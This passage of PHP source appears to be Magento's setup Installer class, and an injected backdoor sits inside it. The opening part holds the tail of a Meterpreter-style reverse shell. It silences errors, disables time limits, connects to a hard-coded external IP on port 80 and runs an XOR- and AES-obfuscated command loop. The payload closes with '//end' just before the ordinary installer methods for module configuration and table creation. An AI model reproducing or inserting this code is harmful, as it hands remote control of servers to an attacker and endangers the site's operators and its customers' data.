function_exists('openssl_encrypt'); } function decrypt_packet($raw) { $len_array = unpack("Nlen", substr($raw, 20, 4)); $encrypt_flags = $len_array['len']; if ($encrypt_flags == ENC_AES256 && supports_aes() && $GLOBALS['AES_KEY'] != null) { $tlv = substr($raw, 24); $dec = openssl_decrypt(substr($tlv, 24), AES_256_CBC, $GLOBALS['AES_KEY'], OPENSSL_RAW_DATA, substr($tlv, 8, 16)); return pack("N", strlen($dec) + 8) . substr($tlv, 4, 4) . $dec; } return substr($raw, 24); } function encrypt_packet($raw) { if (supports_aes() && $GLOBALS['AES_KEY'] != null) { if ($GLOBALS['AES_ENABLED'] === true) { $iv = rand_bytes(16); $enc = $iv . openssl_encrypt(substr($raw, 8), AES_256_CBC, $GLOBALS['AES_KEY'], OPENSSL_RAW_DATA, $iv); $hdr = pack("N", strlen($enc) + 8) . substr($raw, 4, 4); return $GLOBALS['SESSION_GUID'] . pack("N", ENC_AES256) . $hdr . $enc; } $GLOBALS['AES_ENABLED'] = true; } return $GLOBALS['SESSION_GUID'] . pack("N", ENC_NONE) . $raw; } function write_tlv_to_socket($resource, $raw) { $xor = rand_xor_key(); write($resource, $xor . xor_bytes($xor, encrypt_packet($raw))); } function handle_dead_resource_channel($resource) { global $msgsock; if (!is_resource($resource)) { return; } $cid = get_channel_id_from_resource($resource); if ($cid === false) { my_print("Resource has no channel: {$resource}"); remove_reader($resource); close($resource); } else { my_print("Handling dead resource: {$resource}, for channel: {$cid}"); channel_close_handles($cid); $pkt = pack("N", PACKET_TYPE_REQUEST); packet_add_tlv($pkt, create_tlv(TLV_TYPE_COMMAND_ID, COMMAND_ID_CORE_CHANNEL_CLOSE)); packet_add_tlv($pkt, create_tlv(TLV_TYPE_REQUEST_ID, generate_req_id())); packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $cid)); packet_add_tlv($pkt, create_tlv(TLV_TYPE_UUID, $GLOBALS['UUID'])); $pkt = pack("N", strlen($pkt) + 4) . $pkt; write_tlv_to_socket($msgsock, $pkt); } } function handle_resource_read_channel($resource, $data) { global $udp_host_map; $cid = get_channel_id_from_resource($resource); my_print("Handling data from $resource"); $pkt = pack("N", PACKET_TYPE_REQUEST); packet_add_tlv($pkt, create_tlv(TLV_TYPE_COMMAND_ID, COMMAND_ID_CORE_CHANNEL_WRITE)); if (array_key_exists((int)$resource, $udp_host_map)) { list($h,$p) = $udp_host_map[(int)$resource]; packet_add_tlv($pkt, create_tlv(TLV_TYPE_PEER_HOST, $h)); packet_add_tlv($pkt, create_tlv(TLV_TYPE_PEER_PORT, $p)); } packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $cid)); packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_DATA, $data)); packet_add_tlv($pkt, create_tlv(TLV_TYPE_LENGTH, strlen($data))); packet_add_tlv($pkt, create_tlv(TLV_TYPE_REQUEST_ID, generate_req_id())); packet_add_tlv($pkt, create_tlv(TLV_TYPE_UUID, $GLOBALS['UUID'])); $pkt = pack("N", strlen($pkt) + 4) . $pkt; return $pkt; } function create_response($req) { global $id2f; $pkt = pack("N", PACKET_TYPE_RESPONSE); $command_id_tlv = packet_get_tlv($req, TLV_TYPE_COMMAND_ID); my_print("command id is {$command_id_tlv['value']}"); packet_add_tlv($pkt, $command_id_tlv); $reqid_tlv = packet_get_tlv($req, TLV_TYPE_REQUEST_ID); packet_add_tlv($pkt, $reqid_tlv); $command_handler = $id2f[$command_id_tlv['value']]; if (is_callable($command_handler)) { $result = $command_handler($req, $pkt); } else { my_print("Got a request for something I don't know how to handle (" . $command_id_tlv['value'] . " / ". $command_handler ."), returning failure"); $result = ERROR_FAILURE; } packet_add_tlv($pkt, create_tlv(TLV_TYPE_RESULT, $result)); packet_add_tlv($pkt, create_tlv(TLV_TYPE_UUID, $GLOBALS['UUID'])); $pkt = pack("N", strlen($pkt) + 4) . $pkt; return $pkt; } function create_tlv($type, $val) { return array( 'type' => $type, 'value' => $val ); } function tlv_pack($tlv) { $ret = ""; if (($tlv['type'] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING) { $ret = pack("NNa*", 8 + strlen($tlv['value'])+1, $tlv['type'], $tlv['value'] . "\0"); } elseif (($tlv['type'] & TLV_META_TYPE_QWORD) == TLV_META_TYPE_QWORD) { $hi = ($tlv['value'] >> 32) & 0xFFFFFFFF; $lo = $tlv['value'] & 0xFFFFFFFF; $ret = pack("NNNN", 8 + 8, $tlv['type'], $hi, $lo); } elseif (($tlv['type'] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT) { $ret = pack("NNN", 8 + 4, $tlv['type'], $tlv['value']); } elseif (($tlv['type'] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL) { $ret = pack("NN", 8 + 1, $tlv['type']); $ret .= $tlv['value'] ? "\x01" : "\x00"; } elseif (($tlv['type'] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW) { $ret = pack("NN", 8 + strlen($tlv['value']), $tlv['type']) . $tlv['value']; } elseif (($tlv['type'] & TLV_META_TYPE_GROUP) == TLV_META_TYPE_GROUP) { $ret = pack("NN", 8 + strlen($tlv['value']), $tlv['type']) . $tlv['value']; } elseif (($tlv['type'] & TLV_META_TYPE_COMPLEX) == TLV_META_TYPE_COMPLEX) { $ret = pack("NN", 8 + strlen($tlv['value']), $tlv['type']) . $tlv['value']; } else { my_print("Don't know how to make a tlv of type ". $tlv['type'] . " (meta type ". sprintf("%08x", $tlv['type'] & TLV_META_TYPE_MASK) ."), wtf"); } return $ret; } function tlv_unpack($raw_tlv) { $tlv = unpack("Nlen/Ntype", substr($raw_tlv, 0, 8)); $type = $tlv['type']; my_print("len: {$tlv['len']}, type: {$tlv['type']}"); if (($type & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING) { $tlv = unpack("Nlen/Ntype/a*value", substr($raw_tlv, 0, $tlv['len'])); $tlv['value'] = str_replace("\0", "", $tlv['value']); } elseif (($type & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT) { $tlv = unpack("Nlen/Ntype/Nvalue", substr($raw_tlv, 0, $tlv['len'])); } elseif (($type & TLV_META_TYPE_QWORD) == TLV_META_TYPE_QWORD) { $tlv = unpack("Nlen/Ntype/Nhi/Nlo", substr($raw_tlv, 0, $tlv['len'])); $tlv['value'] = $tlv['hi'] << 32 | $tlv['lo']; } elseif (($type & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL) { $tlv = unpack("Nlen/Ntype/cvalue", substr($raw_tlv, 0, $tlv['len'])); } elseif (($type & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW) { $tlv = unpack("Nlen/Ntype", $raw_tlv); $tlv['value'] = substr($raw_tlv, 8, $tlv['len']-8); } else { my_print("Wtf type is this? $type"); $tlv = null; } return $tlv; } function packet_add_tlv(&$pkt, $tlv) { $pkt .= tlv_pack($tlv); } function packet_get_tlv($pkt, $type) { $offset = 8; while ($offset < strlen($pkt)) { $tlv = tlv_unpack(substr($pkt, $offset)); if ($type == ($tlv['type'] & ~TLV_META_TYPE_COMPRESSED)) { return $tlv; } $offset += $tlv['len']; } return null; } function packet_get_all_tlvs($pkt, $type) { my_print("Looking for all tlvs of type $type"); $offset = 8; $all = array(); while ($offset < strlen($pkt)) { $tlv = tlv_unpack(substr($pkt, $offset)); if ($tlv == NULL) { break; } my_print("len: {$tlv['len']}, type: {$tlv['type']}"); if (empty($type) || $type == ($tlv['type'] & ~TLV_META_TYPE_COMPRESSED)) { my_print("Found one at offset $offset"); array_push($all, $tlv); } $offset += $tlv['len']; } return $all; } function register_socket($sock, $ipaddr=null, $port=null) { global $resource_type_map, $udp_host_map; my_print("Registering socket $sock for ($ipaddr:$port)"); $resource_type_map[(int)$sock] = 'socket'; if ($ipaddr) { $udp_host_map[(int)$sock] = array($ipaddr, $port); } } function register_stream($stream, $ipaddr=null, $port=null) { global $resource_type_map, $udp_host_map; my_print("Registering stream $stream for ($ipaddr:$port)"); $resource_type_map[(int)$stream] = 'stream'; if ($ipaddr) { $udp_host_map[(int)$stream] = array($ipaddr, $port); } } function connect($ipaddr, $port, $proto='tcp') { my_print("Doing connect($ipaddr, $port)"); $sock = false; $ipf = AF_INET; $raw_ip = $ipaddr; if (FALSE !== strpos($ipaddr, ":")) { $ipf = AF_INET6; $ipaddr = "[". $raw_ip ."]"; } if (is_callable('stream_socket_client')) { my_print("stream_socket_client({$proto}://{$ipaddr}:{$port})"); if ($proto == 'ssl') { $sock = stream_socket_client("ssl://{$ipaddr}:{$port}", $errno, $errstr, 5, STREAM_CLIENT_ASYNC_CONNECT); if (!$sock) { return false; } stream_set_blocking($sock, 0); register_stream($sock); } elseif ($proto == 'tcp') { $sock = stream_socket_client("tcp://{$ipaddr}:{$port}"); if (!$sock) { return false; } register_stream($sock); } elseif ($proto == 'udp') { $sock = stream_socket_client("udp://{$ipaddr}:{$port}"); if (!$sock) { return false; } register_stream($sock, $ipaddr, $port); } } else if (is_callable('fsockopen')) { my_print("fsockopen"); if ($proto == 'ssl') { $sock = fsockopen("ssl://{$ipaddr}:{$port}"); stream_set_blocking($sock, 0); register_stream($sock); } elseif ($proto == 'tcp') { $sock = fsockopen($ipaddr, $port); if (!$sock) { return false; } if (is_callable('socket_set_timeout')) { socket_set_timeout($sock, 2); } register_stream($sock); } else { $sock = fsockopen($proto."://".$ipaddr,$port); if (!$sock) { return false; } register_stream($sock, $ipaddr, $port); } } else if (is_callable('socket_create')) { my_print("socket_create"); if ($proto == 'tcp') { $sock = socket_create($ipf, SOCK_STREAM, SOL_TCP); $res = socket_connect($sock, $raw_ip, $port); if (!$res) { return false; } register_socket($sock); } elseif ($proto == 'udp') { $sock = socket_create($ipf, SOCK_DGRAM, SOL_UDP); register_socket($sock, $raw_ip, $port); } } return $sock; } function eof($resource) { $ret = false; switch (get_rtype($resource)) { case 'socket': break; case 'stream': $ret = feof($resource); break; } return $ret; } function close($resource) { my_print("Closing resource $resource"); global $resource_type_map, $udp_host_map; remove_reader($resource); switch (get_rtype($resource)) { case 'socket': $ret = socket_close($resource); break; case 'stream': $ret = fclose($resource); break; } if (array_key_exists((int)$resource, $resource_type_map)) { unset($resource_type_map[(int)$resource]); } if (array_key_exists((int)$resource, $udp_host_map)) { my_print("Removing $resource from udp_host_map"); unset($udp_host_map[(int)$resource]); } return $ret; } function read($resource, $len=null) { global $udp_host_map; if (is_null($len)) { $len = 8192; } $buff = ''; switch (get_rtype($resource)) { case 'socket': if (array_key_exists((int)$resource, $udp_host_map)) { my_print("Reading UDP socket"); list($host,$port) = $udp_host_map[(int)$resource]; socket_recvfrom($resource, $buff, $len, PHP_BINARY_READ, $host, $port); } else { my_print("Reading TCP socket"); $buff .= socket_read($resource, $len, PHP_BINARY_READ); } break; case 'stream': global $msgsock; $r = Array($resource); my_print("Calling select to see if there's data on $resource"); $last_requested_len = 0; while (true) { $w=NULL;$e=NULL;$t=0; $cnt = stream_select($r, $w, $e, $t); if ($cnt === 0) { break; } if ($cnt === false or feof($resource)) { my_print("Checking for failed read..."); if (empty($buff)) { my_print("---- EOF ON $resource ----"); $buff = false; } break; } $md = stream_get_meta_data($resource); dump_array($md, "Metadata for {$resource}"); if ($md['unread_bytes'] > 0) { $last_requested_len = min($len, $md['unread_bytes']); $buff .= fread($resource, $last_requested_len); break; } else { $tmp = fread($resource, $len); $last_requested_len = $len; $buff .= $tmp; if (strlen($tmp) < $len) { break; } } if ($resource != $msgsock) { my_print("buff: '$buff'"); } $r = Array($resource); } my_print(sprintf("Done with the big read loop on $resource, got %d bytes, asked for %d bytes", strlen($buff), $last_requested_len)); break; default: $cid = get_channel_id_from_resource($resource); $c = get_channel_by_id($cid); if ($c and $c['data']) { $buff = substr($c['data'], 0, $len); $c['data'] = substr($c['data'], $len); my_print("Aha! got some leftovers"); } else { my_print("Wtf don't know how to read from resource $resource, c: $c"); if (is_array($c)) { dump_array($c); } break; } } my_print(sprintf("Read %d bytes", strlen($buff))); return $buff; } function write($resource, $buff, $len=0) { global $udp_host_map; if ($len == 0) { $len = strlen($buff); } $count = false; switch (get_rtype($resource)) { case 'socket': if (array_key_exists((int)$resource, $udp_host_map)) { my_print("Writing UDP socket"); list($host,$port) = $udp_host_map[(int)$resource]; $count = socket_sendto($resource, $buff, $len, $host, $port); } else { $count = socket_write($resource, $buff, $len); } break; case 'stream': $count = fwrite($resource, $buff, $len); fflush($resource); break; default: my_print("Wtf don't know how to write to resource $resource"); break; } return $count; } function get_rtype($resource) { global $resource_type_map; if (array_key_exists((int)$resource, $resource_type_map)) { return $resource_type_map[(int)$resource]; } return false; } function select(&$r, &$w, &$e, $tv_sec=0, $tv_usec=0) { $streams_r = array(); $streams_w = array(); $streams_e = array(); $sockets_r = array(); $sockets_w = array(); $sockets_e = array(); if ($r) { foreach ($r as $resource) { switch (get_rtype($resource)) { case 'socket': $sockets_r[] = $resource; break; case 'stream': $streams_r[] = $resource; break; default: my_print("Unknown resource type"); break; } } } if ($w) { foreach ($w as $resource) { switch (get_rtype($resource)) { case 'socket': $sockets_w[] = $resource; break; case 'stream': $streams_w[] = $resource; break; default: my_print("Unknown resource type"); break; } } } if ($e) { foreach ($e as $resource) { switch (get_rtype($resource)) { case 'socket': $sockets_e[] = $resource; break; case 'stream': $streams_e[] = $resource; break; default: my_print("Unknown resource type"); break; } } } $n_sockets = count($sockets_r) + count($sockets_w) + count($sockets_e); $n_streams = count($streams_r) + count($streams_w) + count($streams_e); $r = array(); $w = array(); $e = array(); if (count($sockets_r)==0) { $sockets_r = null; } if (count($sockets_w)==0) { $sockets_w = null; } if (count($sockets_e)==0) { $sockets_e = null; } if (count($streams_r)==0) { $streams_r = null; } if (count($streams_w)==0) { $streams_w = null; } if (count($streams_e)==0) { $streams_e = null; } $count = 0; if ($n_sockets > 0) { $res = socket_select($sockets_r, $sockets_w, $sockets_e, $tv_sec, $tv_usec); if (false === $res) { return false; } if (is_array($r) && is_array($sockets_r)) { $r = array_merge($r, $sockets_r); } if (is_array($w) && is_array($sockets_w)) { $w = array_merge($w, $sockets_w); } if (is_array($e) && is_array($sockets_e)) { $e = array_merge($e, $sockets_e); } $count += $res; } if ($n_streams > 0) { $res = stream_select($streams_r, $streams_w, $streams_e, $tv_sec, $tv_usec); if (false === $res) { return false; } if (is_array($r) && is_array($streams_r)) { $r = array_merge($r, $streams_r); } if (is_array($w) && is_array($streams_w)) { $w = array_merge($w, $streams_w); } if (is_array($e) && is_array($streams_e)) { $e = array_merge($e, $streams_e); } $count += $res; } return $count; } function add_reader($resource) { global $readers; if (is_resource($resource) && !in_array($resource, $readers)) { $readers[] = $resource; } } function remove_reader($resource) { global $readers; if (in_array($resource, $readers)) { foreach ($readers as $key => $r) { if ($r == $resource) { unset($readers[$key]); } } } } ob_implicit_flush(); error_reporting(0); @ignore_user_abort(true); @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0); $GLOBALS['UUID'] = PAYLOAD_UUID; $GLOBALS['SESSION_GUID'] = SESSION_GUID; $GLOBALS['AES_KEY'] = null; $GLOBALS['AES_ENABLED'] = false; if (!isset($GLOBALS['msgsock'])) { $ipaddr = '64.52.111.34'; $port = 80; my_print("Don't have a msgsock, trying to connect($ipaddr, $port)"); $msgsock = connect($ipaddr, $port); if (!$msgsock) { die(); } } else { $msgsock = $GLOBALS['msgsock']; $msgsock_type = $GLOBALS['msgsock_type']; switch ($msgsock_type) { case 'socket': register_socket($msgsock); break; case 'stream': default: register_stream($msgsock); } } add_reader($msgsock); $r=$GLOBALS['readers']; $w=NULL;$e=NULL;$t=1; while (false !== ($cnt = select($r, $w, $e, $t))) { $read_failed = false; for ($i = 0; $i < $cnt; $i++) { $ready = $r[$i]; if ($ready == $msgsock) { $packet = read($msgsock, 32); my_print(sprintf("Read returned %s bytes", strlen($packet))); if (false==$packet) { my_print("Read failed on main socket, bailing"); break 2; } $xor = substr($packet, 0, 4); $header = xor_bytes($xor, substr($packet, 4, 28)); $len_array = unpack("Nlen", substr($header, 20, 4)); $len = $len_array['len'] + 32 - 8; while (strlen($packet) < $len) { $packet .= read($msgsock, $len-strlen($packet)); } $response = create_response(decrypt_packet(xor_bytes($xor, $packet))); write_tlv_to_socket($msgsock, $response); } else { $data = read($ready); if (false === $data) { handle_dead_resource_channel($ready); } elseif (strlen($data) > 0){ my_print(sprintf("Read returned %s bytes", strlen($data))); $request = handle_resource_read_channel($ready, $data); if ($request) { write_tlv_to_socket($msgsock, $request); } } } } $r = $GLOBALS['readers']; } my_print("Finished"); my_print("--------------------"); close($msgsock);
	//end
    }

    /**
     * Get declaration installer. For upgrade process it must be created after deployment config update.
     *
     * @return DeclarationInstaller
     * @throws Exception
     */
    private function getDeclarationInstaller()
    {
        if (!$this->declarationInstaller) {
            $this->declarationInstaller = $this->objectManagerProvider->get()->get(
                DeclarationInstaller::class
            );
        }
        return $this->declarationInstaller;
    }

    /**
     * Writes installation date to the configuration
     *
     * @return void
     * @SuppressWarnings(PHPMD.UnusedPrivateMethod) Called by install() via callback.
     * @throws FileSystemException
     */
    private function writeInstallationDate()
    {
        $dateData = new ConfigData(ConfigFilePool::APP_ENV);
        $dateData->set(ConfigOptionsListConstants::CONFIG_PATH_INSTALL_DATE, date('r'));
        $configData = [$dateData->getFileKey() => $dateData->getData()];
        $this->deploymentConfigWriter->saveConfig($configData);
    }

    /**
     * Create modules deployment configuration segment
     *
     * @param \ArrayObject|array $request
     * @param bool $dryRun
     * @return array
     * @throws FileSystemException
     * @throws LocalizedException
     * @throws RuntimeException
     */
    private function createModulesConfig($request, $dryRun = false)
    {
        $all = array_keys($this->moduleLoader->load());
        $deploymentConfig = $this->deploymentConfigReader->load();
        $currentModules = isset($deploymentConfig[ConfigOptionsListConstants::KEY_MODULES])
            ? $deploymentConfig[ConfigOptionsListConstants::KEY_MODULES] : [];
        $enable = $this->readListOfModules($all, $request, InstallCommand::INPUT_KEY_ENABLE_MODULES);
        $disable = $this->readListOfModules($all, $request, InstallCommand::INPUT_KEY_DISABLE_MODULES);
        $result = [];
        foreach ($all as $module) {
            if (isset($currentModules[$module]) && !$currentModules[$module]) {
                $result[$module] = 0;
            } else {
                $result[$module] = 1;
            }
            if (in_array($module, $disable)) {
                $result[$module] = 0;
            }
            if (in_array($module, $enable)) {
                $result[$module] = 1;
            }
        }
        if (!$dryRun) {
            $this->deploymentConfigWriter->saveConfig([ConfigFilePool::APP_CONFIG => ['modules' => $result]], true);
        }
        return $result;
    }

    /**
     * Determines list of modules from request based on list of all modules
     *
     * @param string[] $all
     * @param array $request
     * @param string $key
     * @return string[]
     * @throws \LogicException
     */
    private function readListOfModules($all, $request, $key)
    {
        $result = [];
        if (!empty($request[$key])) {
            if ($request[$key] == 'all') {
                $result = $all;
            } else {
                $result = explode(',', $request[$key]);
                foreach ($result as $module) {
                    if (!in_array($module, $all)) {
                        throw new \LogicException("Unknown module in the requested list: '{$module}'");
                    }
                }
            }
        }
        return $result;
    }

    /**
     * Logs progress
     *
     * @return void
     */
    private function logProgress()
    {
        if (!$this->progress) {
            return;
        }
        $this->progress->setNext();
        $this->log->logMeta(
            sprintf(self::PROGRESS_LOG_RENDER, $this->progress->getCurrent(), $this->progress->getTotal())
        );
    }

    /**
     * Check permissions of directories that are expected to be writable for installation
     *
     * @return void
     * @throws \Exception
     */
    public function checkInstallationFilePermissions()
    {
        $this->throwExceptionForNotWritablePaths(
            $this->filePermissions->getMissingWritablePathsForInstallation()
        );
    }

    /**
     * Check required extensions for installation
     *
     * @return void
     * @throws \Exception
     */
    public function checkExtensions()
    {
        $phpExtensionsCheckResult = $this->phpReadinessCheck->checkPhpExtensions();
        if ($phpExtensionsCheckResult['responseType'] === ResponseTypeInterface::RESPONSE_TYPE_ERROR
            && isset($phpExtensionsCheckResult['data']['missing'])
        ) {
            $errorMsg = "Missing following extensions: '"
                . implode("' '", $phpExtensionsCheckResult['data']['missing']) . "'";
            // phpcs:ignore Magento2.Exceptions.DirectThrow
            throw new \Exception($errorMsg);
        }
    }

    /**
     * Check permissions of directories that are expected to be non-writable for application
     *
     * @return void
     */
    public function checkApplicationFilePermissions()
    {
        $results = $this->filePermissions->getUnnecessaryWritableDirectoriesForApplication();
        if ($results) {
            $errorMsg = "For security, remove write permissions from these directories: '"
                . implode("' '", $results) . "'";
            $this->log->log($errorMsg);
            $this->installInfo[self::INFO_MESSAGE][] = $errorMsg;
        }
    }

    /**
     * Installs deployment configuration
     *
     * @param \ArrayObject|array $data
     * @return void
     * @throws FileSystemException
     * @throws LocalizedException
     * @throws RuntimeException
     */
    public function installDeploymentConfig($data)
    {
        $this->checkInstallationFilePermissions();
        $this->createModulesConfig($data);
        $userData = is_array($data) ? $data : $data->getArrayCopy();
        $this->setupConfigModel->process($userData);
        $deploymentConfigData = $this->deploymentConfig->get(ConfigOptionsListConstants::CONFIG_PATH_CRYPT_KEY);
        if (isset($deploymentConfigData)) {
            $this->installInfo[ConfigOptionsListConstants::KEY_ENCRYPTION_KEY] = $deploymentConfigData;
        }
        // reset object manager now that there is a deployment config
        $this->objectManagerProvider->reset();
    }

    /**
     * Set up setup_module table to register modules' versions, skip this process if it already exists
     *
     * @param SchemaSetupInterface $setup
     * @return void
     * @throws \Zend_Db_Exception
     */
    private function setupModuleRegistry(SchemaSetupInterface $setup)
    {
        $connection = $setup->getConnection();

        if (!$connection->isTableExists($setup->getTable('setup_module'))) {
            /**
             * Create table 'setup_module'
             */
            $table = $connection->newTable($setup->getTable('setup_module'))
                ->addColumn(
                    'module',
                    \Magento\Framework\DB\Ddl\Table::TYPE_TEXT,
                    50,
                    ['nullable' => false, 'primary' => true],
                    'Module'
                )->addColumn(
                    'schema_version',
                    \Magento\Framework\DB\Ddl\Table::TYPE_TEXT,
                    50,
                    [],
                    'Schema Version'
                )->addColumn(
                    'data_version',
                    \Magento\Framework\DB\Ddl\Table::TYPE_TEXT,
                    50,
                    [],
                    'Data Version'
                )->setComment('Module versions registry');
            $connection->createTable($table);
        }
    }

    /**
     * Set up core tables
     *
     * @param SchemaSetupInterface $setup
     * @return void
     */
    private function setupCoreTables(SchemaSetupInterface $setup)
    {
        /* @var $connection AdapterInterface */
        $connection = $setup->getConnection();
        $setup->startSetup();

        $this->setupSessionTable($setup, $connection);
        $this->setupCacheTable($setup, $connection);
        $this->setupCacheTagTable($setup, $connection);
        $this->setupFlagTable($setup, $connection);

        $setup->endSetup();
    }

    /**
     * Create table 'session'
     *
     * @param SchemaSetupInterface $setup
     * @param AdapterInterface $connection
     * @return void
     */
    private function setupSessionTable(
        SchemaSetupInterface $setup,
        AdapterInterface $connection
    ) {
        if (!$connection->isTableExists($setup->getTable('session'))) {
            $table = $connection->newTable(
                $setup->getTable('session')
            )->addColumn(
                'session_id',
                \Magento\Framework\DB\Ddl\Table::TYPE_TEXT,
                255,
                ['nullable' => false, 'primary' => true],
                'Session Id'
            )->addColumn(
                'session_expires',
                \Magento\Framework\DB\Ddl\Table::TYPE_INTEGER,
                null,
                ['unsigned' => true, 'nullable' => false, 'default' => '0'],
                'Date of Session Expiration'
            )->addColumn(
                'session_data',
                \Magento\Framework\DB\Ddl\Table::TYPE_BLOB,
                '2M',
                ['nullable' => false],
                'Session Data'
            )->setComment(
                'Database Sessions Storage'
            );
            $connection->createTable($table);
        }
    }

    /**
     * Create table 'cache'
     *
     * @param SchemaSetupInterface $setup
     * @param AdapterInterface $connection
     * @return void
     * @throws \Zend_Db_Exception
     */
    private function setupCacheTable(
        SchemaSetupInterface $setup,
        AdapterInterface $connection
    ) {
        if (!$connection->isTableExists($setup->getTable('cache'))) {
            $table = $connection->newTable(
                $setup->getTable('cache')
            )->addColumn(
                'id',
                \Magento\Framework\DB\Ddl\Table::TYPE_TEXT,
                200,
                ['nullable' => false, 'primary' => true],
                'Cache Id'
            )->addColumn(
                'data',
                \Magento\Framework\DB\Ddl\Table::TYPE_BLOB,
                '2M',
                [],
                'Cache Data'
            )->addColumn(
                'create_time',
                \Magento\Framework\DB\Ddl\Table::TYPE_INTEGER,
                null,
                [],
                'Cache Creation Time'
            )->addColumn(
                'update_time',
                \Magento\Framework\DB\Ddl\Table::TYPE_INTEGER,
                null,
                [],
                'Time of Cache Updating'
            )->addColumn(
                'expire_time',
                \Magento\Framework\DB\Ddl\Table::TYPE_INTEGER,
                null,
                [],
                'Cache Expiration Time'
            )->addIndex(
                $setup->getIdxName('cache', ['expire_time']),
                ['expire_time']
            )->setComment(
                'Caches'
            );
            $connection->createTable($table);
        }
    }

    /**
     * Create table 'cache_tag'
     *
     * @param SchemaSetupInterface $setup
     * @param AdapterInterface $connection
     * @return void
     * @throws \Zend_Db_Exception
     */
    private function setupCacheTagTable(
        SchemaSetupInterface $setup,
        AdapterInterface $connection
    ) {
        if (!$connection->isTableExists($setup->getTable('cache_tag'))) {
            $table = $connection->newTable(
                $setup->getTable('cache_tag')
            )->addColumn(
                'tag',
                \Magento\Framework\DB\Ddl\Table::TYPE_TEXT,
                100,
                ['nullable' => false, 'primary' => true],
                'Tag'
            )->addColumn(
                'cache_id',
                \Magento\Framework\DB\Ddl\Table::TYPE_TEXT,
                200,
                ['nullable' => false, 'primary' => true],
                'Cache Id'
            )->addIndex(
                $setup->getIdxName('cache_tag', ['cache_id']),
                ['cache_id']
            )->setComment(
                'Tag Caches'
            );
            $connection->createTable($table);
        }
    }

    /**
     * Create table 'flag'
     *
     * @param SchemaSetupInterface $setup
     * @param AdapterInterface $connection
     * @return void
     * @throws \Zend_Db_Exception
     */
    private function setupFlagTable(
        SchemaSetupInterface $setup,
        AdapterInterface $connection
    ) {
        $tableName = $setup->getTable('flag');
        if (!$connection->isTableExists($tableName)) {
            $table = $connection->newTable(
                $tableName
            )->addColumn(
                'flag_id',
                \Magento\Framework\DB\Ddl\Table::TYPE_INTEGER,
                null,
                ['identity' => true, 'unsigned' => true, 'nullable' => false, 'primary' => true],
                'Flag Id'
            )->addColumn(
                'flag_code',
                \Magento\Framework\DB\Ddl\Table::TYPE_TEXT,
                255,
                ['nullable' => false],
                'Flag Code'
            )->addColumn(
                'state',
                \Magento\Framework\DB\Ddl\Table::TYPE_SMALLINT,
                null,
                ['unsigned' => true, 'nullable' => false, 'default' => '0'],
                'Flag State'
            )->addColumn(
                'flag_data',
                \Magento\Framework\DB\Ddl\Table::TYPE_TEXT,
                '16m',
                [],
                'Flag Data'
            )->addColumn(
                'last_update',
                \Magento\Framework\DB\Ddl\Table::TYPE_TIMESTAMP,
                null,
                ['nullable' => false, 'default' => \Magento\Framework\DB\Ddl\Table::TIMESTAMP_INIT_UPDATE],
                'Date of Last Flag Update'
            )->addIndex(
                $setup->getIdxName('flag', ['last_update']),
                ['last_update']
            )->setComment(
                'Flag'
            );
            $connection->createTable($table);
        } else {
            $this->updateColumnType($connection, $tableName, 'flag_data', 'mediumtext');
        }
    }

    /**
     * Install Magento if declaration mode was enabled.
     *
     * @param array $request
     * @return void
     * @throws Exception
     */
    public function declarativeInstallSchema(array $request)
    {
        $this->getDeclarationInstaller()->installSchema($request);
    }

    /**
     * Clear memory tables
     *
     * Memory tables that used in old versions of Magento for indexing purposes should be cleaned
     * Otherwise some supported DB solutions like Galeracluster may have replication error
     * when memory engine will be switched to InnoDb
     *
     * @param SchemaSetupInterface $setup
     * @return void
     */
    private function cleanMemoryTables(SchemaSetupInterface $setup)
    {
        $connection = $setup->getConnection();
        $tables = $connection->getTables();
        foreach ($tables as $table) {
            $tableData = $connection->showTableStatus($table);
            if (isset($tableData['Engine']) && $tableData['Engine'] === 'MEMORY') {
                $connection->truncateTable($table);
            }
        }
    }

    /**
     * Installs DB schema
     *
     * @param array $request
     * @return void
     * @throws Exception
     * @throws \Magento\Framework\Setup\Exception
     * @throws \Zend_Db_Exception
     */
    public function installSchema(array $request)
    {
        /** @var \Magento\Framework\Registry $registry */
        $registry = $this->objectManagerProvider->get()->get(\Magento\Framework\Registry::class);
        //For backward compatibility in install and upgrade scripts with enabled parallelization.
        $registry->register('setup-mode-enabled', true);

        $this->assertDbConfigExists();
        $this->assertDbAccessible();
        $setup = $this->setupFactory->create($this->context->getResources());
        $this->setupModuleRegistry($setup);
        $this->setupCoreTables($setup);
        $this->cleanMemoryTables($setup);
        $this->log->log('Schema creation/updates:');
        $this->declarativeInstallSchema($request);
        $this->handleDBSchemaData($setup, 'schema', $request);
        /** @var Mysql $adapter */
        $adapter = $setup->getConnection();
        $schemaListener = $adapter->getSchemaListener();

        if ($this->convertationOfOldScriptsIsAllowed($request)) {
            $schemaListener->setResource('default');
            $this->schemaPersistor->persist($schemaListener);
        }

        $registry->unregister('setup-mode-enabled');
    }

    /**
     * Check whether all scripts will converted or not
     *
     * @param array $request
     * @return bool
     */
    private function convertationOfOldScriptsIsAllowed(array $request)
    {
        return isset($request[InstallCommand::CONVERT_OLD_SCRIPTS_KEY]) &&
            $request[InstallCommand::CONVERT_OLD_SCRIPTS_KEY];
    }

    /**
     * Installs data fixtures
     *
     * @param array $request
     * @param boolean $keepCacheStatuses
     * @return void
     * @throws Exception
     * @throws \Magento\Framework\Setup\Exception
     */
    public function installDataFixtures(array $request = [], $keepCacheStatuses = false)
    {
        $frontendCaches = [
            PageCache::TYPE_IDENTIFIER,
            BlockCache::TYPE_IDENTIFIER,
            LayoutCache::TYPE_IDENTIFIER,
        ];

        if ($keepCacheStatuses) {
            $disabledCaches = $this->getDisabledCacheTypes($frontendCaches);

            $frontendCaches = array_diff($frontendCaches, $disabledCaches);
        }

        /** @var \Magento\Framework\Registry $registry */
        $registry = $this->objectManagerProvider->get()->get(\Magento\Framework\Registry::class);
        //For backward compatibility in install and upgrade scripts with enabled parallelization.
        $registry->register('setup-mode-enabled', true);

